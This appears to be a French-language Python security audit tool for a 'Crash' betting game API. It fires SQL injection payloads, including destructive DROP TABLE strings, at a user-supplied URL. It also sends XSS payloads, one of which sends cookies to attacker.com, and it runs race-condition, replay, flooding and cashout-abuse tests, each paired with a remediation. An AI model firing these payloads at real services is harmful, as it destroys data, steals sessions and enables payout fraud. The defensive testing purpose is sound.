#!/usr/bin/env python3
"""
Suite de tests de sécurité pour le jeu Crash
Auteur: Équipe de sécurité
Date: 24 Novembre 2025

Ce script automatise les tests de sécurité du jeu Crash pour identifier
les vulnérabilités potentielles.
"""

import requests
import json
import time
import hashlib
import random
import concurrent.futures
import numpy as np
from typing import List, Dict, Tuple
from dataclasses import dataclass
from datetime import datetime
import websocket
import threading

@dataclass
class Vulnerability:
    """Représente une vulnérabilité trouvée"""
    type: str
    severity: str  # CRITICAL, HIGH, MEDIUM, LOW
    description: str
    payload: str = ""
    proof_of_concept: str = ""
    remediation: str = ""

class CrashGameSecurityTester:
    """
    Testeur de sécurité complet pour le jeu Crash
    """

    def __init__(self, base_url: str, api_key: str = None):
        self.base_url = base_url.rstrip('/')
        self.api_key = api_key
        self.session = requests.Session()
        self.vulnerabilities: List[Vulnerability] = []

        # Headers par défaut
        self.session.headers.update({
            'User-Agent': 'SecurityTester/1.0',
            'Content-Type': 'application/json'
        })

        if api_key:
            self.session.headers['Authorization'] = f'Bearer {api_key}'

    def log(self, message: str, level: str = "INFO"):
        """Affiche un message avec timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        prefix = {
            "INFO": "[*]",
            "SUCCESS": "[✓]",
            "WARNING": "[!]",
            "ERROR": "[✗]",
            "VULN": "[🔴]"
        }.get(level, "[*]")

        print(f"{timestamp} {prefix} {message}")

    def add_vulnerability(self, vuln: Vulnerability):
        """Ajoute une vulnérabilité à la liste"""
        self.vulnerabilities.append(vuln)
        self.log(f"VULNÉRABILITÉ TROUVÉE: {vuln.type} - {vuln.description}", "VULN")

    # ==================== TESTS D'INJECTION ====================

    def test_sql_injection(self) -> bool:
        """Test d'injection SQL sur tous les endpoints"""
        self.log("Test d'injection SQL...")

        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE bets; --",
            "' UNION SELECT NULL, NULL, NULL--",
            "1' AND '1'='1",
            "admin'--",
            "' OR 1=1--",
            "') OR ('1'='1",
            "' WAITFOR DELAY '0:0:5'--",
            "1'; EXEC sp_MSForEachTable 'DROP TABLE ?'; --"
        ]

        # Endpoints à tester
        endpoints = [
            ("/api/bet", {"user_id": "{payload}", "amount": 100}),
            ("/api/user/{payload}", {}),
            ("/api/round/{payload}", {}),
            ("/api/history", {"user_id": "{payload}"})
        ]

        found_vuln = False

        for payload in sql_payloads:
            for endpoint, data in endpoints:
                try:
                    # Remplacer {payload} dans l'URL et les données
                    url = endpoint.replace("{payload}", payload)
                    test_data = {k: v.replace("{payload}", payload) if isinstance(v, str) else v
                                for k, v in data.items()}

                    response = self.session.post(
                        f"{self.base_url}{url}",
                        json=test_data,
                        timeout=10
                    )

                    # Indicateurs d'injection SQL
                    if (response.status_code == 500 or
                        "sql" in response.text.lower() or
                        "mysql" in response.text.lower() or
                        "syntax error" in response.text.lower() or
                        "postgresql" in response.text.lower()):

                        self.add_vulnerability(Vulnerability(
                            type="SQL_INJECTION",
                            severity="CRITICAL",
                            description=f"Injection SQL détectée sur {endpoint}",
                            payload=payload,
                            proof_of_concept=f"URL: {url}\nPayload: {payload}\nResponse: {response.status_code}",
                            remediation="Utiliser des prepared statements et valider toutes les entrées"
                        ))
                        found_vuln = True

                except Exception as e:
                    self.log(f"Erreur lors du test SQL: {e}", "ERROR")

        if not found_vuln:
            self.log("Aucune injection SQL détectée", "SUCCESS")

        return found_vuln

    def test_xss(self) -> bool:
        """Test de Cross-Site Scripting"""
        self.log("Test de XSS...")

        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<body onload=alert('XSS')>",
            "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src='x' onerror='fetch(\"http://attacker.com/steal?cookie=\"+document.cookie)'>"
        ]

        found_vuln = False

        # Tester sur username, messages, etc.
        for payload in xss_payloads:
            try:
                # Test sur inscription/profil
                response = self.session.post(
                    f"{self.base_url}/api/user/update",
                    json={"username": payload}
                )

                # Récupérer le profil
                profile = self.session.get(f"{self.base_url}/api/user/profile")

                if payload in profile.text and "text/html" in profile.headers.get('Content-Type', ''):
                    self.add_vulnerability(Vulnerability(
                        type="XSS",
                        severity="HIGH",
                        description="Cross-Site Scripting dans le profil utilisateur",
                        payload=payload,
                        remediation="Sanitizer toutes les entrées utilisateur et utiliser CSP headers"
                    ))
                    found_vuln = True

            except Exception as e:
                pass

        if not found_vuln:
            self.log("Aucun XSS détecté", "SUCCESS")

        return found_vuln

    # ==================== TESTS DE LOGIQUE MÉTIER ====================

    def test_negative_bet(self) -> bool:
        """Test de pari négatif"""
        self.log("Test de pari négatif...")

        try:
            response = self.session.post(
                f"{self.base_url}/api/bet",
                json={
                    "amount": -1000,
                    "round_id": "test_round"
                }
            )

            if response.status_code == 200:
                self.add_vulnerability(Vulnerability(
                    type="NEGATIVE_BET",
                    severity="CRITICAL",
                    description="Paris négatifs acceptés - permettrait de générer de l'argent",
                    payload="-1000",
                    remediation="Valider que amount > 0 côté serveur"
                ))
                return True
            else:
                self.log("Paris négatifs correctement rejetés", "SUCCESS")
                return False

        except Exception as e:
            self.log(f"Erreur lors du test de pari négatif: {e}", "ERROR")
            return False

    def test_excessive_bet(self) -> bool:
        """Test de pari excessif"""
        self.log("Test de pari excessif...")

        excessive_amounts = [
            999999999,
            float('inf'),
            1e100,
            -float('inf')
        ]

        for amount in excessive_amounts:
            try:
                response = self.session.post(
                    f"{self.base_url}/api/bet",
                    json={"amount": amount, "round_id": "test"}
                )

                if response.status_code == 200:
                    self.add_vulnerability(Vulnerability(
                        type="EXCESSIVE_BET",
                        severity="HIGH",
                        description=f"Montant excessif accepté: {amount}",
                        payload=str(amount),
                        remediation="Implémenter une limite maximale de pari"
                    ))
                    return True

            except Exception as e:
                pass

        self.log("Montants excessifs correctement rejetés", "SUCCESS")
        return False

    def test_race_condition(self) -> bool:
        """Test de race condition sur cashout"""
        self.log("Test de race condition...")

        bet_id = f"test_bet_{random.randint(1000, 9999)}"

        def attempt_cashout():
            try:
                return self.session.post(
                    f"{self.base_url}/api/cashout",
                    json={
                        "bet_id": bet_id,
                        "multiplier": 2.5
                    },
                    timeout=5
                )
            except:
                return None

        # Envoyer 100 requêtes simultanées
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            futures = [executor.submit(attempt_cashout) for _ in range(100)]
            results = [f.result() for f in futures if f.result() is not None]

        successful = [r for r in results if r.status_code == 200]

        if len(successful) > 1:
            self.add_vulnerability(Vulnerability(
                type="RACE_CONDITION",
                severity="CRITICAL",
                description=f"{len(successful)} cashouts simultanés réussis pour un même pari",
                proof_of_concept=f"Bet ID: {bet_id}, Successful cashouts: {len(successful)}",
                remediation="Implémenter des locks pessimistes sur les transactions"
            ))
            return True
        else:
            self.log("Pas de race condition détectée", "SUCCESS")
            return False

    def test_late_cashout(self) -> bool:
        """Test de cashout après le crash"""
        self.log("Test de cashout tardif...")

        try:
            # Obtenir un round terminé
            history = self.session.get(f"{self.base_url}/api/rounds/history")
            if history.status_code == 200:
                rounds = history.json()
                if rounds:
                    crashed_round = rounds[0]

                    # Tenter de cashout sur ce round terminé
                    response = self.session.post(
                        f"{self.base_url}/api/cashout",
                        json={
                            "round_id": crashed_round['id'],
                            "bet_id": "fake_bet",
                            "multiplier": crashed_round.get('crash_point', 5.0) + 1
                        }
                    )

                    if response.status_code == 200:
                        self.add_vulnerability(Vulnerability(
                            type="LATE_CASHOUT",
                            severity="CRITICAL",
                            description="Cashout après le crash accepté",
                            remediation="Valider que le round est toujours actif côté serveur"
                        ))
                        return True

        except Exception as e:
            self.log(f"Erreur lors du test de cashout tardif: {e}", "ERROR")

        self.log("Cashouts tardifs correctement rejetés", "SUCCESS")
        return False

    def test_double_cashout(self) -> bool:
        """Test de double cashout"""
        self.log("Test de double cashout...")

        bet_id = f"test_bet_{random.randint(1000, 9999)}"

        try:
            # Premier cashout
            response1 = self.session.post(
                f"{self.base_url}/api/cashout",
                json={"bet_id": bet_id, "multiplier": 2.0}
            )

            time.sleep(0.1)

            # Deuxième cashout
            response2 = self.session.post(
                f"{self.base_url}/api/cashout",
                json={"bet_id": bet_id, "multiplier": 3.0}
            )

            if response1.status_code == 200 and response2.status_code == 200:
                self.add_vulnerability(Vulnerability(
                    type="DOUBLE_CASHOUT",
                    severity="CRITICAL",
                    description="Double cashout accepté pour un même pari",
                    remediation="Marquer les paris comme 'cashed out' après le premier cashout"
                ))
                return True

        except Exception as e:
            pass

        self.log("Double cashout correctement empêché", "SUCCESS")
        return False

    # ==================== TESTS DU RNG ====================

    def test_rng_predictability(self, sample_size: int = 1000) -> bool:
        """Test de prévisibilité du RNG"""
        self.log(f"Test de prévisibilité du RNG ({sample_size} échantillons)...")

        try:
            crash_points = []

            # Collecter les résultats
            for i in range(sample_size):
                response = self.session.get(f"{self.base_url}/api/round/history?limit=1")
                if response.status_code == 200:
                    data = response.json()
                    if data and len(data) > 0:
                        crash_points.append(data[0].get('crash_point', 1.0))

                if i % 100 == 0:
                    self.log(f"Collecte: {i}/{sample_size} échantillons")

                time.sleep(0.1)  # Ne pas surcharger le serveur

            if len(crash_points) < 100:
                self.log("Pas assez d'échantillons collectés", "WARNING")
                return False

            # Analyse statistique
            crash_array = np.array(crash_points)

            # Test 1: Autocorrélation (ne doit pas avoir de pattern)
            autocorr = np.correlate(crash_array, crash_array, mode='full')
            autocorr = autocorr[len(autocorr)//2:]
            autocorr = autocorr / autocorr[0]  # Normaliser

            if np.max(np.abs(autocorr[1:20])) > 0.3:  # Seuil d'autocorrélation
                self.add_vulnerability(Vulnerability(
                    type="RNG_PREDICTABLE",
                    severity="CRITICAL",
                    description="Pattern détecté dans les crash points (autocorrélation élevée)",
                    proof_of_concept=f"Autocorrélation max: {np.max(np.abs(autocorr[1:20]))}",
                    remediation="Utiliser un CSPRNG (crypto.randomBytes) au lieu de Math.random()"
                ))
                return True

            # Test 2: Distribution (vérifier si équitable)
            mean = np.mean(crash_array)
            expected_mean = 2.0  # Valeur théorique pour un jeu équitable

            if abs(mean - expected_mean) > 0.5:
                self.log(f"Warning: Moyenne des crash points suspecte: {mean}", "WARNING")

            # Test 3: Runs test (séquences)
            median = np.median(crash_array)
            runs = [1 if x > median else 0 for x in crash_array]

            # Compter les runs
            n_runs = 1
            for i in range(1, len(runs)):
                if runs[i] != runs[i-1]:
                    n_runs += 1

            # Nombre attendu de runs
            n1 = sum(runs)
            n2 = len(runs) - n1
            expected_runs = (2 * n1 * n2) / (n1 + n2) + 1

            if abs(n_runs - expected_runs) > 3 * np.sqrt(expected_runs):
                self.log("Pattern suspect détecté (runs test)", "WARNING")

            self.log(f"RNG semble aléatoire (moyenne: {mean:.2f}, runs: {n_runs})", "SUCCESS")
            return False

        except Exception as e:
            self.log(f"Erreur lors du test RNG: {e}", "ERROR")
            return False

    def test_provably_fair(self) -> bool:
        """Test du système Provably Fair"""
        self.log("Test du système Provably Fair...")

        try:
            # Obtenir le seed hash avant le round
            pre_response = self.session.get(f"{self.base_url}/api/round/seed_hash")

            if pre_response.status_code != 200:
                self.add_vulnerability(Vulnerability(
                    type="NO_PROVABLY_FAIR",
                    severity="HIGH",
                    description="Système Provably Fair non implémenté",
                    remediation="Implémenter un système Provably Fair avec seed hash"
                ))
                return True

            seed_hash = pre_response.json().get('seed_hash')

            # Attendre la fin du round
            time.sleep(5)

            # Récupérer le seed révélé
            post_response = self.session.get(f"{self.base_url}/api/round/revealed_seed")

            if post_response.status_code == 200:
                revealed_seed = post_response.json().get('server_seed')

                # Vérifier le hash
                calculated_hash = hashlib.sha256(revealed_seed.encode()).hexdigest()

                if calculated_hash != seed_hash:
                    self.add_vulnerability(Vulnerability(
                        type="PROVABLY_FAIR_BROKEN",
                        severity="CRITICAL",
                        description="Hash du seed ne correspond pas - système Provably Fair compromis",
                        remediation="Corriger la génération et validation des seeds"
                    ))
                    return True
                else:
                    self.log("Système Provably Fair fonctionne correctement", "SUCCESS")
                    return False

        except Exception as e:
            self.log(f"Impossible de tester Provably Fair: {e}", "WARNING")

        return False

    # ==================== TESTS DE SÉCURITÉ RÉSEAU ====================

    def test_replay_attack(self) -> bool:
        """Test d'attaque par rejeu"""
        self.log("Test d'attaque par rejeu...")

        try:
            # Faire une requête légitime
            original_response = self.session.post(
                f"{self.base_url}/api/bet",
                json={"amount": 10, "round_id": "test"}
            )

            if original_response.status_code != 200:
                return False

            original_data = original_response.request.body

            # Rejouer la même requête
            time.sleep(1)

            replay_response = self.session.post(
                f"{self.base_url}/api/bet",
                data=original_data,
                headers=original_response.request.headers
            )

            if replay_response.status_code == 200:
                self.add_vulnerability(Vulnerability(
                    type="REPLAY_ATTACK",
                    severity="HIGH",
                    description="Attaque par rejeu possible - requêtes peuvent être réutilisées",
                    remediation="Implémenter des nonces/timestamps avec validation côté serveur"
                ))
                return True

        except Exception as e:
            pass

        self.log("Protection contre replay attack détectée", "SUCCESS")
        return False

    def test_rate_limiting(self) -> bool:
        """Test de rate limiting"""
        self.log("Test de rate limiting...")

        try:
            # Envoyer beaucoup de requêtes rapidement
            responses = []
            for i in range(200):
                response = self.session.get(f"{self.base_url}/api/status")
                responses.append(response.status_code)

            # Vérifier si on a été bloqué (429 Too Many Requests)
            if 429 not in responses:
                self.add_vulnerability(Vulnerability(
                    type="NO_RATE_LIMITING",
                    severity="MEDIUM",
                    description="Pas de rate limiting détecté - vulnérable au flooding",
                    remediation="Implémenter rate limiting (ex: 100 req/min par IP)"
                ))
                return True
            else:
                self.log("Rate limiting en place", "SUCCESS")
                return False

        except Exception as e:
            self.log(f"Erreur lors du test de rate limiting: {e}", "ERROR")
            return False

    def test_timing_attack(self) -> bool:
        """Test d'attaque par timing"""
        self.log("Test d'attaque par timing...")

        try:
            timings = []

            for _ in range(100):
                start = time.time()
                response = self.session.get(f"{self.base_url}/api/round/status")
                elapsed = time.time() - start

                if response.status_code == 200:
                    data = response.json()
                    timings.append({
                        'elapsed': elapsed,
                        'crash_point': data.get('crash_point')
                    })

            # Analyser si le temps de réponse corrèle avec le crash point
            if len(timings) > 10:
                times = [t['elapsed'] for t in timings]
                points = [t['crash_point'] for t in timings if t['crash_point']]

                if len(points) > 10:
                    correlation = np.corrcoef(times[:len(points)], points)[0, 1]

                    if abs(correlation) > 0.3:
                        self.add_vulnerability(Vulnerability(
                            type="TIMING_ATTACK",
                            severity="MEDIUM",
                            description=f"Timing attack possible - corrélation: {correlation}",
                            remediation="Ajouter un délai aléatoire aux réponses"
                        ))
                        return True

        except Exception as e:
            pass

        self.log("Pas de timing attack détectée", "SUCCESS")
        return False

    # ==================== TESTS WEBSOCKET ====================

    def test_websocket_manipulation(self) -> bool:
        """Test de manipulation WebSocket"""
        self.log("Test de manipulation WebSocket...")

        ws_url = self.base_url.replace('http://', 'ws://').replace('https://', 'wss://')
        ws_url += '/ws/crash'

        try:
            ws = websocket.create_connection(ws_url, timeout=5)

            # Test 1: Message malformé
            ws.send("invalid_json{{{")
            response1 = ws.recv()

            # Test 2: Action non autorisée
            ws.send(json.dumps({
                "action": "admin_override",
                "crash_point": 1.01
            }))
            response2 = ws.recv()

            # Test 3: Manipulation du multiplicateur
            ws.send(json.dumps({
                "action": "update_multiplier",
                "multiplier": 999.99
            }))
            response3 = ws.recv()

            ws.close()

            # Si aucune erreur, potentiellement vulnérable
            self.log("WebSocket répond aux messages malformés - inspection manuelle requise", "WARNING")

        except Exception as e:
            self.log(f"WebSocket protégé ou non accessible: {e}", "INFO")

        return False

    # ==================== GÉNÉRATION DU RAPPORT ====================

    def generate_report(self):
        """Génère le rapport d'audit complet"""
        print("\n" + "="*80)
        print(" "*20 + "RAPPORT D'AUDIT DE SÉCURITÉ")
        print("="*80)

        print(f"\nDate: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Cible: {self.base_url}")
        print(f"\nNombre total de vulnérabilités: {len(self.vulnerabilities)}")

        if not self.vulnerabilities:
            print("\n" + "="*80)
            print("[✓] AUCUNE VULNÉRABILITÉ CRITIQUE TROUVÉE")
            print("="*80)
            return

        # Grouper par sévérité
        by_severity = {
            'CRITICAL': [],
            'HIGH': [],
            'MEDIUM': [],
            'LOW': []
        }

        for vuln in self.vulnerabilities:
            by_severity[vuln.severity].append(vuln)

        # Afficher par sévérité
        for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
            vulns = by_severity[severity]
            if vulns:
                print(f"\n{'='*80}")
                print(f" {severity}: {len(vulns)} vulnérabilité(s)")
                print('='*80)

                for i, vuln in enumerate(vulns, 1):
                    print(f"\n{i}. {vuln.type}")
                    print(f"   Description: {vuln.description}")
                    if vuln.payload:
                        print(f"   Payload: {vuln.payload}")
                    if vuln.proof_of_concept:
                        print(f"   PoC: {vuln.proof_of_concept}")
                    print(f"   Remédiation: {vuln.remediation}")

        # Résumé
        print(f"\n{'='*80}")
        print("RÉSUMÉ")
        print('='*80)
        print(f"CRITICAL: {len(by_severity['CRITICAL'])}")
        print(f"HIGH:     {len(by_severity['HIGH'])}")
        print(f"MEDIUM:   {len(by_severity['MEDIUM'])}")
        print(f"LOW:      {len(by_severity['LOW'])}")

        # Sauvegarder dans un fichier
        self.save_report_to_file()

    def save_report_to_file(self):
        """Sauvegarde le rapport dans un fichier JSON"""
        report_data = {
            'timestamp': datetime.now().isoformat(),
            'target': self.base_url,
            'total_vulnerabilities': len(self.vulnerabilities),
            'vulnerabilities': [
                {
                    'type': v.type,
                    'severity': v.severity,
                    'description': v.description,
                    'payload': v.payload,
                    'proof_of_concept': v.proof_of_concept,
                    'remediation': v.remediation
                }
                for v in self.vulnerabilities
            ]
        }

        filename = f"security_audit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, indent=2, ensure_ascii=False)

        self.log(f"Rapport sauvegardé dans {filename}", "SUCCESS")

    # ==================== EXÉCUTION DE TOUS LES TESTS ====================

    def run_all_tests(self):
        """Exécute tous les tests de sécurité"""
        self.log("Démarrage de la suite de tests de sécurité complète")
        self.log("="*80)

        tests = [
            ("Injection SQL", self.test_sql_injection),
            ("Cross-Site Scripting (XSS)", self.test_xss),
            ("Pari négatif", self.test_negative_bet),
            ("Pari excessif", self.test_excessive_bet),
            ("Race condition", self.test_race_condition),
            ("Cashout tardif", self.test_late_cashout),
            ("Double cashout", self.test_double_cashout),
            ("Prévisibilité RNG", lambda: self.test_rng_predictability(500)),
            ("Provably Fair", self.test_provably_fair),
            ("Attaque par rejeu", self.test_replay_attack),
            ("Rate limiting", self.test_rate_limiting),
            ("Timing attack", self.test_timing_attack),
            ("Manipulation WebSocket", self.test_websocket_manipulation)
        ]

        total_tests = len(tests)

        for i, (test_name, test_func) in enumerate(tests, 1):
            print(f"\n{'='*80}")
            print(f"Test {i}/{total_tests}: {test_name}")
            print('='*80)

            try:
                test_func()
            except Exception as e:
                self.log(f"Erreur lors du test {test_name}: {e}", "ERROR")

            time.sleep(1)  # Pause entre les tests

        # Générer le rapport final
        self.generate_report()


def main():
    """Point d'entrée principal"""
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║     SUITE DE TESTS DE SÉCURITÉ - JEU CRASH                  ║
    ║     Version 1.0                                              ║
    ╚══════════════════════════════════════════════════════════════╝
    """)

    # Configuration
    BASE_URL = input("Entrez l'URL de l'API (ex: https://api.example.com): ").strip()
    API_KEY = input("Entrez la clé API (optionnel, appuyez sur Entrée pour ignorer): ").strip()

    if not BASE_URL:
        print("[✗] URL requise!")
        return

    # Créer le testeur
    tester = CrashGameSecurityTester(
        base_url=BASE_URL,
        api_key=API_KEY if API_KEY else None
    )

    # Options de test
    print("\nOptions de test:")
    print("1. Tous les tests (recommandé)")
    print("2. Tests critiques uniquement")
    print("3. Test personnalisé")

    choice = input("\nChoisissez une option (1-3): ").strip()

    if choice == "1":
        tester.run_all_tests()
    elif choice == "2":
        tester.test_sql_injection()
        tester.test_negative_bet()
        tester.test_race_condition()
        tester.test_rng_predictability(1000)
        tester.generate_report()
    elif choice == "3":
        print("\nTests disponibles:")
        print("1. SQL Injection")
        print("2. XSS")
        print("3. Logique métier")
        print("4. RNG")
        print("5. Réseau")
        # Permettre la sélection personnalisée...
    else:
        print("[✗] Option invalide")


if __name__ == "__main__":
    main()
